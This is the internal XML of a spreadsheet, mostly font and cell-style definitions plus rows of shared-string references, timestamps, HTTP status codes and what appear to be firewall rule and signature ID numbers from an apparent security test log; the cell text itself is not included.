      <color rgb="FF1F3864"/>
      <name val="Noto Sans"/>
    </font>
    <font>
      <b/>
      <sz val="10.0"/>
      <color rgb="FF000000"/>
      <name val="Noto Sans"/>
    </font>
    <font>
      <sz val="10.0"/>
      <color theme="1"/>
      <name val="Noto Sans"/>
    </font>
    <font>
      <b/>
      <sz val="10.0"/>
      <color rgb="FF000000"/>
      <name val="Arial"/>
    </font>
    <font>
      <b/>
      <sz val="13.0"/>
      <color rgb="FF1F3864"/>
      <name val="Malgun Gothic"/>
    </font>
    <font>
      <color theme="1"/>
      <name val="Malgun Gothic"/>
    </font>
    <font>
      <b/>
      <sz val="10.0"/>
      <color rgb="FFFFFFFF"/>
      <name val="Malgun Gothic"/>
    </font>
    <font>
      <sz val="10.0"/>
      <color rgb="FF000000"/>
      <name val="Malgun Gothic"/>
    </font>
    <font>
      <sz val="10.0"/>
      <color theme="1"/>
      <name val="Malgun Gothic"/>
    </font>
    <font>
      <b/>
      <sz val="14.0"/>
      <color rgb="FF1F3864"/>
      <name val="Arial"/>
    </font>
    <font>
      <b/>
      <sz val="10.0"/>
      <color rgb="FFFFFFFF"/>
      <name val="Noto Sans"/>
    </font>
    <font>
      <b/>
      <sz val="11.0"/>
      <color rgb="FFFFFFFF"/>
      <name val="Arial"/>
    </font>
    <font>
      <b/>
      <sz val="11.0"/>
      <color rgb="FFFFFFFF"/>
      <name val="Noto Sans"/>
    </font>
    <font>
      <sz val="10.0"/>
      <color rgb="FF000000"/>
      <name val="Arial"/>
    </font>
    <font>
      <sz val="11.0"/>
      <color rgb="FF000000"/>
      <name val="Arial"/>
    </font>
    <font>
      <sz val="9.0"/>
      <color theme="1"/>
      <name val="Consolas"/>
    </font>
    <font>
      <sz val="9.0"/>
      <color theme="1"/>
      <name val="Arial"/>
    </font>
    <font>
      <sz val="8.0"/>
      <color theme="1"/>
      <name val="Consolas"/>
    </font>
    <font>
      <b/>
      <sz val="14.0"/>
      <color rgb="FF1F3864"/>
      <name val="Noto Sans"/>
    </font>
    <font>
      <sz val="9.0"/>
      <color rgb="FF808080"/>
      <name val="Arial"/>
    </font>
    <font>
      <sz val="10.0"/>
      <color rgb="FF000000"/>
      <name val="Noto Sans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  <xf borderId="0" fillId="0" fontId="10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center"/>
    </xf>
    <xf borderId="0" fillId="0" fontId="11" numFmtId="164" xfId="0" applyAlignment="1" applyFont="1" applyNumberFormat="1">
      <alignment horizontal="center"/>
    </xf>
    <xf borderId="1" fillId="2" fontId="12" numFmtId="0" xfId="0" applyAlignment="1" applyBorder="1" applyFill="1" applyFont="1">
      <alignment horizontal="center" shrinkToFit="0" vertical="center" wrapText="1"/>
    </xf>
    <xf borderId="1" fillId="2" fontId="12" numFmtId="164" xfId="0" applyAlignment="1" applyBorder="1" applyFont="1" applyNumberFormat="1">
      <alignment horizontal="center" shrinkToFit="0" vertical="center" wrapText="1"/>
    </xf>
    <xf borderId="1" fillId="2" fontId="12" numFmtId="0" xfId="0" applyAlignment="1" applyBorder="1" applyFont="1">
      <alignment horizontal="center" readingOrder="0" shrinkToFit="0" vertical="center" wrapText="1"/>
    </xf>
    <xf borderId="2" fillId="2" fontId="12" numFmtId="0" xfId="0" applyAlignment="1" applyBorder="1" applyFont="1">
      <alignment horizontal="center" shrinkToFit="0" vertical="center" wrapText="1"/>
    </xf>
    <xf borderId="3" fillId="2" fontId="12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ill="1" applyFont="1">
      <alignment horizontal="center" readingOrder="0" shrinkToFit="0" vertical="center" wrapText="1"/>
    </xf>
    <xf borderId="1" fillId="4" fontId="13" numFmtId="164" xfId="0" applyAlignment="1" applyBorder="1" applyFill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4" fillId="4" fontId="11" numFmtId="0" xfId="0" applyAlignment="1" applyBorder="1" applyFont="1">
      <alignment horizontal="center" shrinkToFit="0" wrapText="1"/>
    </xf>
    <xf borderId="1" fillId="3" fontId="13" numFmtId="0" xfId="0" applyAlignment="1" applyBorder="1" applyFont="1">
      <alignment horizontal="center" shrinkToFit="0" vertical="center" wrapText="1"/>
    </xf>
    <xf borderId="2" fillId="3" fontId="13" numFmtId="0" xfId="0" applyAlignment="1" applyBorder="1" applyFont="1">
      <alignment horizontal="center" shrinkToFit="0" vertical="center" wrapText="1"/>
    </xf>
    <xf borderId="3" fillId="3" fontId="13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3" fillId="3" fontId="13" numFmtId="0" xfId="0" applyAlignment="1" applyBorder="1" applyFont="1">
      <alignment horizontal="center" readingOrder="0" shrinkToFit="0" vertical="center" wrapText="1"/>
    </xf>
    <xf borderId="4" fillId="4" fontId="14" numFmtId="0" xfId="0" applyAlignment="1" applyBorder="1" applyFont="1">
      <alignment horizontal="left" shrinkToFit="0" vertical="center" wrapText="1"/>
    </xf>
    <xf borderId="0" fillId="0" fontId="1" numFmtId="0" xfId="0" applyFont="1"/>
    <xf borderId="2" fillId="0" fontId="13" numFmtId="0" xfId="0" applyAlignment="1" applyBorder="1" applyFont="1">
      <alignment horizontal="center" readingOrder="0" shrinkToFit="0" vertical="center" wrapText="1"/>
    </xf>
    <xf borderId="2" fillId="3" fontId="13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ont="1">
      <alignment horizontal="center" readingOrder="0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1" fillId="0" fontId="13" numFmtId="164" xfId="0" applyAlignment="1" applyBorder="1" applyFont="1" applyNumberFormat="1">
      <alignment horizontal="center" shrinkToFit="0" vertical="center" wrapText="1"/>
    </xf>
    <xf borderId="1" fillId="3" fontId="13" numFmtId="164" xfId="0" applyAlignment="1" applyBorder="1" applyFont="1" applyNumberFormat="1">
      <alignment horizontal="center" shrinkToFit="0" vertical="center" wrapText="1"/>
    </xf>
    <xf borderId="0" fillId="0" fontId="11" numFmtId="164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 shrinkToFit="0" vertical="center" wrapText="0"/>
    </xf>
    <xf borderId="1" fillId="2" fontId="16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horizontal="center" readingOrder="0" shrinkToFit="0" vertical="center" wrapText="1"/>
    </xf>
    <xf borderId="1" fillId="2" fontId="18" numFmtId="0" xfId="0" applyAlignment="1" applyBorder="1" applyFont="1">
      <alignment horizontal="center" readingOrder="0" shrinkToFit="0" vertical="center" wrapText="1"/>
    </xf>
    <xf borderId="1" fillId="3" fontId="19" numFmtId="0" xfId="0" applyAlignment="1" applyBorder="1" applyFont="1">
      <alignment horizontal="center" readingOrder="0" shrinkToFit="0" vertical="center" wrapText="1"/>
    </xf>
    <xf borderId="1" fillId="3" fontId="20" numFmtId="0" xfId="0" applyAlignment="1" applyBorder="1" applyFont="1">
      <alignment horizontal="center" readingOrder="0" shrinkToFit="0" vertical="center" wrapText="1"/>
    </xf>
    <xf borderId="1" fillId="3" fontId="21" numFmtId="0" xfId="0" applyAlignment="1" applyBorder="1" applyFont="1">
      <alignment horizontal="center" readingOrder="0" shrinkToFit="0" vertical="center" wrapText="1"/>
    </xf>
    <xf borderId="1" fillId="3" fontId="19" numFmtId="165" xfId="0" applyAlignment="1" applyBorder="1" applyFont="1" applyNumberFormat="1">
      <alignment horizontal="center" readingOrder="0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readingOrder="0" vertical="center"/>
    </xf>
    <xf borderId="1" fillId="3" fontId="22" numFmtId="0" xfId="0" applyAlignment="1" applyBorder="1" applyFont="1">
      <alignment horizontal="center" readingOrder="0" vertical="center"/>
    </xf>
    <xf borderId="1" fillId="0" fontId="23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0" fillId="0" fontId="24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25" numFmtId="0" xfId="0" applyAlignment="1" applyFont="1">
      <alignment shrinkToFit="0" vertical="bottom" wrapText="0"/>
    </xf>
    <xf borderId="1" fillId="0" fontId="7" numFmtId="0" xfId="0" applyAlignment="1" applyBorder="1" applyFont="1">
      <alignment horizontal="left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horizontal="left" shrinkToFit="0" vertical="center" wrapText="1"/>
    </xf>
    <xf borderId="1" fillId="5" fontId="7" numFmtId="0" xfId="0" applyAlignment="1" applyBorder="1" applyFill="1" applyFont="1">
      <alignment horizontal="left" shrinkToFit="0" vertical="center" wrapText="1"/>
    </xf>
    <xf borderId="1" fillId="5" fontId="19" numFmtId="166" xfId="0" applyAlignment="1" applyBorder="1" applyFont="1" applyNumberFormat="1">
      <alignment horizontal="center" shrinkToFit="0" vertical="center" wrapText="1"/>
    </xf>
    <xf borderId="1" fillId="0" fontId="19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>
        <b/>
        <color rgb="FF375623"/>
        <name val="Arial"/>
      </font>
      <fill>
        <patternFill patternType="solid">
          <fgColor rgb="FFE2EFDA"/>
          <bgColor rgb="FFE2EFDA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6.0"/>
    <col customWidth="1" min="3" max="3" width="96.0"/>
    <col customWidth="1" min="4" max="26" width="8.71"/>
  </cols>
  <sheetData>
    <row r="1">
      <c r="A1" s="1">
        <v>1.0</v>
      </c>
    </row>
    <row r="2">
      <c r="B2" s="2" t="s">
        <v>0</v>
      </c>
    </row>
    <row r="3">
      <c r="B3" s="3" t="s">
        <v>1</v>
      </c>
    </row>
    <row r="5">
      <c r="B5" s="4"/>
      <c r="C5" s="5"/>
    </row>
    <row r="6">
      <c r="B6" s="6" t="s">
        <v>2</v>
      </c>
      <c r="C6" s="5" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="7">
      <c r="B7" s="4"/>
      <c r="C7" s="5"/>
    </row>
    <row r="8">
      <c r="B8" s="6" t="s">
        <v>4</v>
      </c>
      <c r="C8" s="5"/>
    </row>
    <row r="9">
      <c r="B9" s="7" t="s">
        <v>5</v>
      </c>
      <c r="C9" s="5" t="s">
        <v>6</v>
      </c>
    </row>
    <row r="10">
      <c r="B10" s="7" t="s">
        <v>7</v>
      </c>
      <c r="C10" s="8" t="s">
        <v>8</v>
      </c>
    </row>
    <row r="11">
      <c r="B11" s="7" t="s">
        <v>9</v>
      </c>
      <c r="C11" s="8" t="s">
        <v>10</v>
      </c>
    </row>
    <row r="12">
      <c r="B12" s="7" t="s">
        <v>11</v>
      </c>
      <c r="C12" s="5" t="s">
        <v>12</v>
      </c>
    </row>
    <row r="13">
      <c r="B13" s="7" t="s">
        <v>13</v>
      </c>
      <c r="C13" s="9" t="s">
        <v>14</v>
      </c>
    </row>
    <row r="14">
      <c r="B14" s="4"/>
      <c r="C14" s="5"/>
    </row>
    <row r="15">
      <c r="B15" s="6" t="s">
        <v>15</v>
      </c>
      <c r="C15" s="5"/>
    </row>
    <row r="16">
      <c r="B16" s="7" t="s">
        <v>16</v>
      </c>
      <c r="C16" s="8" t="s">
        <v>17</v>
      </c>
    </row>
    <row r="17">
      <c r="B17" s="7" t="s">
        <v>18</v>
      </c>
      <c r="C17" s="8" t="s">
        <v>19</v>
      </c>
    </row>
    <row r="18">
      <c r="B18" s="7" t="s">
        <v>20</v>
      </c>
      <c r="C18" s="8" t="s">
        <v>21</v>
      </c>
    </row>
    <row r="19">
      <c r="B19" s="4"/>
      <c r="C19" s="5"/>
    </row>
    <row r="20">
      <c r="B20" s="6" t="s">
        <v>22</v>
      </c>
      <c r="C20" s="8" t="s">
        <v>23</v>
      </c>
    </row>
    <row r="21" ht="15.75" customHeight="1">
      <c r="B21" s="7" t="s">
        <v>24</v>
      </c>
      <c r="C21" s="8" t="s">
        <v>25</v>
      </c>
    </row>
    <row r="22" ht="15.75" customHeight="1">
      <c r="B22" s="7" t="s">
        <v>26</v>
      </c>
      <c r="C22" s="8" t="s">
        <v>27</v>
      </c>
    </row>
    <row r="23" ht="15.75" customHeight="1">
      <c r="B23" s="10" t="s">
        <v>28</v>
      </c>
      <c r="C23" s="8" t="s">
        <v>29</v>
      </c>
    </row>
    <row r="24" ht="15.75" customHeight="1">
      <c r="B24" s="4"/>
      <c r="C24" s="5"/>
    </row>
    <row r="25" ht="15.75" customHeight="1">
      <c r="B25" s="6" t="s">
        <v>30</v>
      </c>
      <c r="C25" s="8" t="s">
        <v>31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3.57"/>
    <col customWidth="1" min="3" max="3" width="10.0"/>
    <col customWidth="1" min="4" max="4" width="20.86"/>
    <col customWidth="1" min="5" max="5" width="14.0"/>
    <col customWidth="1" min="6" max="6" width="15.43"/>
    <col customWidth="1" min="7" max="7" width="14.0"/>
    <col customWidth="1" min="8" max="8" width="13.0"/>
    <col customWidth="1" min="9" max="9" width="7.0"/>
    <col customWidth="1" min="10" max="10" width="46.0"/>
    <col customWidth="1" min="11" max="12" width="10.0"/>
    <col customWidth="1" min="13" max="13" width="12.29"/>
    <col customWidth="1" min="14" max="14" width="13.86"/>
    <col customWidth="1" min="15" max="15" width="34.0"/>
    <col customWidth="1" min="16" max="16" width="14.0"/>
    <col customWidth="1" min="17" max="17" width="8.0"/>
    <col customWidth="1" min="18" max="19" width="10.0"/>
    <col customWidth="1" min="20" max="29" width="8.71"/>
  </cols>
  <sheetData>
    <row r="1" ht="24.0" customHeight="1">
      <c r="A1" s="11" t="s">
        <v>32</v>
      </c>
      <c r="S1" s="11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>
      <c r="A2" s="12"/>
      <c r="B2" s="13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ht="30.0" customHeight="1">
      <c r="A3" s="14" t="s">
        <v>33</v>
      </c>
      <c r="B3" s="15" t="s">
        <v>34</v>
      </c>
      <c r="C3" s="14" t="s">
        <v>35</v>
      </c>
      <c r="D3" s="16" t="s">
        <v>36</v>
      </c>
      <c r="E3" s="16" t="s">
        <v>37</v>
      </c>
      <c r="F3" s="14" t="s">
        <v>38</v>
      </c>
      <c r="G3" s="14" t="s">
        <v>39</v>
      </c>
      <c r="H3" s="14" t="s">
        <v>40</v>
      </c>
      <c r="I3" s="14" t="s">
        <v>41</v>
      </c>
      <c r="J3" s="14" t="s">
        <v>42</v>
      </c>
      <c r="K3" s="16" t="s">
        <v>43</v>
      </c>
      <c r="L3" s="16" t="s">
        <v>44</v>
      </c>
      <c r="M3" s="16" t="s">
        <v>45</v>
      </c>
      <c r="N3" s="14" t="s">
        <v>46</v>
      </c>
      <c r="O3" s="14" t="s">
        <v>47</v>
      </c>
      <c r="P3" s="14" t="s">
        <v>48</v>
      </c>
      <c r="Q3" s="14" t="s">
        <v>49</v>
      </c>
      <c r="R3" s="17" t="s">
        <v>50</v>
      </c>
      <c r="S3" s="18" t="s">
        <v>51</v>
      </c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ht="37.5" customHeight="1">
      <c r="A4" s="19">
        <v>1.0</v>
      </c>
      <c r="B4" s="20">
        <v>46178.58692129629</v>
      </c>
      <c r="C4" s="21" t="s">
        <v>52</v>
      </c>
      <c r="D4" s="22" t="s">
        <v>53</v>
      </c>
      <c r="E4" s="23" t="s">
        <v>54</v>
      </c>
      <c r="F4" s="19" t="s">
        <v>55</v>
      </c>
      <c r="G4" s="19" t="s">
        <v>56</v>
      </c>
      <c r="H4" s="22" t="s">
        <v>57</v>
      </c>
      <c r="I4" s="19"/>
      <c r="J4" s="19" t="s">
        <v>58</v>
      </c>
      <c r="K4" s="19">
        <v>942100.0</v>
      </c>
      <c r="L4" s="19">
        <v>2053468.0</v>
      </c>
      <c r="M4" s="19">
        <v>200.0</v>
      </c>
      <c r="N4" s="19" t="s">
        <v>59</v>
      </c>
      <c r="O4" s="19" t="s">
        <v>60</v>
      </c>
      <c r="P4" s="19" t="s">
        <v>61</v>
      </c>
      <c r="Q4" s="24"/>
      <c r="R4" s="25"/>
      <c r="S4" s="26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ht="37.5" customHeight="1">
      <c r="A5" s="22">
        <v>2.0</v>
      </c>
      <c r="B5" s="20">
        <v>46178.596817129626</v>
      </c>
      <c r="C5" s="21" t="s">
        <v>52</v>
      </c>
      <c r="D5" s="22" t="s">
        <v>53</v>
      </c>
      <c r="E5" s="22" t="s">
        <v>62</v>
      </c>
      <c r="F5" s="22" t="s">
        <v>55</v>
      </c>
      <c r="G5" s="19" t="s">
        <v>56</v>
      </c>
      <c r="H5" s="22" t="s">
        <v>57</v>
      </c>
      <c r="I5" s="21"/>
      <c r="J5" s="22" t="s">
        <v>63</v>
      </c>
      <c r="K5" s="22">
        <v>942100.0</v>
      </c>
      <c r="L5" s="22"/>
      <c r="M5" s="22">
        <v>200.0</v>
      </c>
      <c r="N5" s="22" t="s">
        <v>59</v>
      </c>
      <c r="O5" s="22" t="s">
        <v>60</v>
      </c>
      <c r="P5" s="22" t="s">
        <v>61</v>
      </c>
      <c r="Q5" s="21"/>
      <c r="R5" s="27"/>
      <c r="S5" s="28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ht="37.5" customHeight="1">
      <c r="A6" s="19">
        <v>3.0</v>
      </c>
      <c r="B6" s="20">
        <v>46178.596817129626</v>
      </c>
      <c r="C6" s="21" t="s">
        <v>52</v>
      </c>
      <c r="D6" s="22" t="s">
        <v>53</v>
      </c>
      <c r="E6" s="22" t="s">
        <v>62</v>
      </c>
      <c r="F6" s="22" t="s">
        <v>55</v>
      </c>
      <c r="G6" s="19" t="s">
        <v>56</v>
      </c>
      <c r="H6" s="22" t="s">
        <v>57</v>
      </c>
      <c r="I6" s="21"/>
      <c r="J6" s="22" t="s">
        <v>63</v>
      </c>
      <c r="K6" s="22"/>
      <c r="L6" s="22" t="s">
        <v>64</v>
      </c>
      <c r="M6" s="22">
        <v>200.0</v>
      </c>
      <c r="N6" s="22" t="s">
        <v>65</v>
      </c>
      <c r="O6" s="22" t="s">
        <v>66</v>
      </c>
      <c r="P6" s="22" t="s">
        <v>61</v>
      </c>
      <c r="Q6" s="21"/>
      <c r="R6" s="27"/>
      <c r="S6" s="29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ht="37.5" customHeight="1">
      <c r="A7" s="19">
        <v>4.0</v>
      </c>
      <c r="B7" s="20">
        <v>46178.600486111114</v>
      </c>
      <c r="C7" s="21" t="s">
        <v>52</v>
      </c>
      <c r="D7" s="19" t="s">
        <v>67</v>
      </c>
      <c r="E7" s="19" t="s">
        <v>68</v>
      </c>
      <c r="F7" s="19" t="s">
        <v>69</v>
      </c>
      <c r="G7" s="19" t="s">
        <v>56</v>
      </c>
      <c r="H7" s="22" t="s">
        <v>57</v>
      </c>
      <c r="I7" s="24"/>
      <c r="J7" s="22" t="s">
        <v>70</v>
      </c>
      <c r="K7" s="19">
        <v>941100.0</v>
      </c>
      <c r="L7" s="19"/>
      <c r="M7" s="19">
        <v>302.0</v>
      </c>
      <c r="N7" s="19" t="s">
        <v>59</v>
      </c>
      <c r="O7" s="19" t="s">
        <v>67</v>
      </c>
      <c r="P7" s="24"/>
      <c r="Q7" s="24"/>
      <c r="R7" s="25"/>
      <c r="S7" s="26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ht="37.5" customHeight="1">
      <c r="A8" s="22">
        <v>5.0</v>
      </c>
      <c r="B8" s="20">
        <v>46178.600486111114</v>
      </c>
      <c r="C8" s="21" t="s">
        <v>52</v>
      </c>
      <c r="D8" s="19" t="s">
        <v>67</v>
      </c>
      <c r="E8" s="19" t="s">
        <v>68</v>
      </c>
      <c r="F8" s="19" t="s">
        <v>69</v>
      </c>
      <c r="G8" s="19" t="s">
        <v>56</v>
      </c>
      <c r="H8" s="22" t="s">
        <v>57</v>
      </c>
      <c r="I8" s="24"/>
      <c r="J8" s="22" t="s">
        <v>70</v>
      </c>
      <c r="K8" s="19"/>
      <c r="L8" s="19" t="s">
        <v>71</v>
      </c>
      <c r="M8" s="19">
        <v>302.0</v>
      </c>
      <c r="N8" s="19" t="s">
        <v>65</v>
      </c>
      <c r="O8" s="19" t="s">
        <v>67</v>
      </c>
      <c r="P8" s="24"/>
      <c r="Q8" s="24"/>
      <c r="R8" s="25"/>
      <c r="S8" s="29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ht="37.5" customHeight="1">
      <c r="A9" s="19">
        <v>6.0</v>
      </c>
      <c r="B9" s="20">
        <v>46178.60555555556</v>
      </c>
      <c r="C9" s="21" t="s">
        <v>52</v>
      </c>
      <c r="D9" s="19" t="s">
        <v>67</v>
      </c>
      <c r="E9" s="22" t="s">
        <v>68</v>
      </c>
      <c r="F9" s="22" t="s">
        <v>69</v>
      </c>
      <c r="G9" s="19" t="s">
        <v>56</v>
      </c>
      <c r="H9" s="22" t="s">
        <v>57</v>
      </c>
      <c r="I9" s="21"/>
      <c r="J9" s="22" t="s">
        <v>72</v>
      </c>
      <c r="K9" s="22">
        <v>941100.0</v>
      </c>
      <c r="L9" s="21"/>
      <c r="M9" s="22">
        <v>302.0</v>
      </c>
      <c r="N9" s="22" t="s">
        <v>59</v>
      </c>
      <c r="O9" s="22" t="s">
        <v>67</v>
      </c>
      <c r="P9" s="22" t="s">
        <v>61</v>
      </c>
      <c r="Q9" s="21"/>
      <c r="R9" s="27"/>
      <c r="S9" s="28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ht="37.5" customHeight="1">
      <c r="A10" s="19">
        <v>7.0</v>
      </c>
      <c r="B10" s="20">
        <v>46178.60555555556</v>
      </c>
      <c r="C10" s="21" t="s">
        <v>52</v>
      </c>
      <c r="D10" s="19" t="s">
        <v>67</v>
      </c>
      <c r="E10" s="22" t="s">
        <v>68</v>
      </c>
      <c r="F10" s="22" t="s">
        <v>69</v>
      </c>
      <c r="G10" s="19" t="s">
        <v>56</v>
      </c>
      <c r="H10" s="22" t="s">
        <v>57</v>
      </c>
      <c r="I10" s="21"/>
      <c r="J10" s="22" t="s">
        <v>72</v>
      </c>
      <c r="K10" s="22"/>
      <c r="L10" s="22" t="s">
        <v>73</v>
      </c>
      <c r="M10" s="22">
        <v>302.0</v>
      </c>
      <c r="N10" s="22" t="s">
        <v>65</v>
      </c>
      <c r="O10" s="22" t="s">
        <v>67</v>
      </c>
      <c r="P10" s="22" t="s">
        <v>74</v>
      </c>
      <c r="Q10" s="21"/>
      <c r="R10" s="25"/>
      <c r="S10" s="29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ht="37.5" customHeight="1">
      <c r="A11" s="22">
        <v>8.0</v>
      </c>
      <c r="B11" s="20">
        <v>46178.612916666665</v>
      </c>
      <c r="C11" s="21" t="s">
        <v>52</v>
      </c>
      <c r="D11" s="22" t="s">
        <v>67</v>
      </c>
      <c r="E11" s="22" t="s">
        <v>75</v>
      </c>
      <c r="F11" s="22" t="s">
        <v>69</v>
      </c>
      <c r="G11" s="19" t="s">
        <v>56</v>
      </c>
      <c r="H11" s="22" t="s">
        <v>57</v>
      </c>
      <c r="I11" s="21"/>
      <c r="J11" s="22" t="s">
        <v>72</v>
      </c>
      <c r="K11" s="22">
        <v>921130.0</v>
      </c>
      <c r="L11" s="21"/>
      <c r="M11" s="22">
        <v>302.0</v>
      </c>
      <c r="N11" s="22" t="s">
        <v>59</v>
      </c>
      <c r="O11" s="22" t="s">
        <v>76</v>
      </c>
      <c r="P11" s="21"/>
      <c r="Q11" s="21"/>
      <c r="R11" s="27"/>
      <c r="S11" s="28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ht="37.5" customHeight="1">
      <c r="A12" s="19">
        <v>9.0</v>
      </c>
      <c r="B12" s="20">
        <v>46178.612916666665</v>
      </c>
      <c r="C12" s="21" t="s">
        <v>52</v>
      </c>
      <c r="D12" s="22" t="s">
        <v>67</v>
      </c>
      <c r="E12" s="22" t="s">
        <v>75</v>
      </c>
      <c r="F12" s="22" t="s">
        <v>69</v>
      </c>
      <c r="G12" s="19" t="s">
        <v>56</v>
      </c>
      <c r="H12" s="22" t="s">
        <v>57</v>
      </c>
      <c r="I12" s="21"/>
      <c r="J12" s="22" t="s">
        <v>72</v>
      </c>
      <c r="K12" s="24"/>
      <c r="L12" s="19" t="s">
        <v>77</v>
      </c>
      <c r="M12" s="19">
        <v>200.0</v>
      </c>
      <c r="N12" s="19" t="s">
        <v>65</v>
      </c>
      <c r="O12" s="22" t="s">
        <v>76</v>
      </c>
      <c r="P12" s="24"/>
      <c r="Q12" s="24"/>
      <c r="R12" s="25"/>
      <c r="S12" s="29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ht="37.5" customHeight="1">
      <c r="A13" s="19">
        <v>10.0</v>
      </c>
      <c r="B13" s="20">
        <v>46178.615532407406</v>
      </c>
      <c r="C13" s="21" t="s">
        <v>52</v>
      </c>
      <c r="D13" s="22" t="s">
        <v>78</v>
      </c>
      <c r="E13" s="22" t="s">
        <v>79</v>
      </c>
      <c r="F13" s="22" t="s">
        <v>55</v>
      </c>
      <c r="G13" s="19" t="s">
        <v>56</v>
      </c>
      <c r="H13" s="22" t="s">
        <v>57</v>
      </c>
      <c r="I13" s="21"/>
      <c r="J13" s="22" t="s">
        <v>72</v>
      </c>
      <c r="K13" s="22">
        <v>944110.0</v>
      </c>
      <c r="L13" s="22">
        <v>2053461.0</v>
      </c>
      <c r="M13" s="22">
        <v>200.0</v>
      </c>
      <c r="N13" s="22" t="s">
        <v>59</v>
      </c>
      <c r="O13" s="22" t="s">
        <v>80</v>
      </c>
      <c r="P13" s="21"/>
      <c r="Q13" s="21"/>
      <c r="R13" s="27"/>
      <c r="S13" s="28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ht="37.5" customHeight="1">
      <c r="A14" s="22">
        <v>11.0</v>
      </c>
      <c r="B14" s="20">
        <v>46178.615532407406</v>
      </c>
      <c r="C14" s="21" t="s">
        <v>52</v>
      </c>
      <c r="D14" s="22" t="s">
        <v>78</v>
      </c>
      <c r="E14" s="22" t="s">
        <v>79</v>
      </c>
      <c r="F14" s="22" t="s">
        <v>55</v>
      </c>
      <c r="G14" s="19" t="s">
        <v>56</v>
      </c>
      <c r="H14" s="22" t="s">
        <v>57</v>
      </c>
      <c r="I14" s="21"/>
      <c r="J14" s="22" t="s">
        <v>72</v>
      </c>
      <c r="K14" s="22"/>
      <c r="L14" s="22" t="s">
        <v>81</v>
      </c>
      <c r="M14" s="22">
        <v>200.0</v>
      </c>
      <c r="N14" s="22" t="s">
        <v>59</v>
      </c>
      <c r="O14" s="22" t="s">
        <v>80</v>
      </c>
      <c r="P14" s="21"/>
      <c r="Q14" s="21"/>
      <c r="R14" s="27"/>
      <c r="S14" s="29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ht="37.5" customHeight="1">
      <c r="A15" s="19">
        <v>12.0</v>
      </c>
      <c r="B15" s="20">
        <v>46178.62425925926</v>
      </c>
      <c r="C15" s="22" t="s">
        <v>52</v>
      </c>
      <c r="D15" s="22" t="s">
        <v>78</v>
      </c>
      <c r="E15" s="30" t="s">
        <v>82</v>
      </c>
      <c r="F15" s="22" t="s">
        <v>69</v>
      </c>
      <c r="G15" s="19" t="s">
        <v>56</v>
      </c>
      <c r="H15" s="22" t="s">
        <v>57</v>
      </c>
      <c r="I15" s="21"/>
      <c r="J15" s="22" t="s">
        <v>83</v>
      </c>
      <c r="K15" s="22">
        <v>930100.0</v>
      </c>
      <c r="L15" s="22" t="s">
        <v>84</v>
      </c>
      <c r="M15" s="22">
        <v>200.0</v>
      </c>
      <c r="N15" s="22" t="s">
        <v>59</v>
      </c>
      <c r="O15" s="22" t="s">
        <v>78</v>
      </c>
      <c r="P15" s="24"/>
      <c r="Q15" s="21"/>
      <c r="R15" s="27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ht="37.5" customHeight="1">
      <c r="A16" s="19">
        <v>13.0</v>
      </c>
      <c r="B16" s="20">
        <v>46178.62425925926</v>
      </c>
      <c r="C16" s="22" t="s">
        <v>52</v>
      </c>
      <c r="D16" s="22" t="s">
        <v>78</v>
      </c>
      <c r="E16" s="30" t="s">
        <v>82</v>
      </c>
      <c r="F16" s="19" t="s">
        <v>69</v>
      </c>
      <c r="G16" s="19" t="s">
        <v>56</v>
      </c>
      <c r="H16" s="19" t="s">
        <v>57</v>
      </c>
      <c r="I16" s="24"/>
      <c r="J16" s="22" t="s">
        <v>83</v>
      </c>
      <c r="K16" s="24"/>
      <c r="L16" s="19" t="s">
        <v>85</v>
      </c>
      <c r="M16" s="19">
        <v>200.0</v>
      </c>
      <c r="N16" s="19" t="s">
        <v>59</v>
      </c>
      <c r="O16" s="22" t="s">
        <v>78</v>
      </c>
      <c r="P16" s="31"/>
      <c r="Q16" s="24"/>
      <c r="R16" s="25"/>
      <c r="S16" s="29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ht="37.5" customHeight="1">
      <c r="A17" s="22">
        <v>14.0</v>
      </c>
      <c r="B17" s="20">
        <v>46178.62967592593</v>
      </c>
      <c r="C17" s="22" t="s">
        <v>52</v>
      </c>
      <c r="D17" s="22" t="s">
        <v>53</v>
      </c>
      <c r="E17" s="22" t="s">
        <v>86</v>
      </c>
      <c r="F17" s="22" t="s">
        <v>55</v>
      </c>
      <c r="G17" s="19" t="s">
        <v>56</v>
      </c>
      <c r="H17" s="19" t="s">
        <v>57</v>
      </c>
      <c r="I17" s="21"/>
      <c r="J17" s="22" t="s">
        <v>87</v>
      </c>
      <c r="K17" s="22">
        <v>942100.0</v>
      </c>
      <c r="L17" s="21"/>
      <c r="M17" s="22">
        <v>200.0</v>
      </c>
      <c r="N17" s="22" t="s">
        <v>59</v>
      </c>
      <c r="O17" s="22" t="s">
        <v>88</v>
      </c>
      <c r="P17" s="21"/>
      <c r="Q17" s="21"/>
      <c r="R17" s="27"/>
      <c r="S17" s="29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ht="37.5" customHeight="1">
      <c r="A18" s="19">
        <v>15.0</v>
      </c>
      <c r="B18" s="20">
        <v>46178.62967592593</v>
      </c>
      <c r="C18" s="22" t="s">
        <v>52</v>
      </c>
      <c r="D18" s="22" t="s">
        <v>53</v>
      </c>
      <c r="E18" s="22" t="s">
        <v>86</v>
      </c>
      <c r="F18" s="22" t="s">
        <v>55</v>
      </c>
      <c r="G18" s="19" t="s">
        <v>56</v>
      </c>
      <c r="H18" s="19" t="s">
        <v>57</v>
      </c>
      <c r="I18" s="21"/>
      <c r="J18" s="22" t="s">
        <v>87</v>
      </c>
      <c r="K18" s="21"/>
      <c r="L18" s="22" t="s">
        <v>89</v>
      </c>
      <c r="M18" s="22">
        <v>200.0</v>
      </c>
      <c r="N18" s="22" t="s">
        <v>65</v>
      </c>
      <c r="O18" s="22" t="s">
        <v>88</v>
      </c>
      <c r="P18" s="21"/>
      <c r="Q18" s="21"/>
      <c r="R18" s="27"/>
      <c r="S18" s="29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ht="37.5" customHeight="1">
      <c r="A19" s="19">
        <v>16.0</v>
      </c>
      <c r="B19" s="20">
        <v>46178.632997685185</v>
      </c>
      <c r="C19" s="22" t="s">
        <v>52</v>
      </c>
      <c r="D19" s="22" t="s">
        <v>53</v>
      </c>
      <c r="E19" s="22" t="s">
        <v>90</v>
      </c>
      <c r="F19" s="22" t="s">
        <v>55</v>
      </c>
      <c r="G19" s="19" t="s">
        <v>56</v>
      </c>
      <c r="H19" s="22" t="s">
        <v>57</v>
      </c>
      <c r="I19" s="21"/>
      <c r="J19" s="22" t="s">
        <v>91</v>
      </c>
      <c r="K19" s="22">
        <v>942100.0</v>
      </c>
      <c r="L19" s="22">
        <v>2010963.0</v>
      </c>
      <c r="M19" s="22">
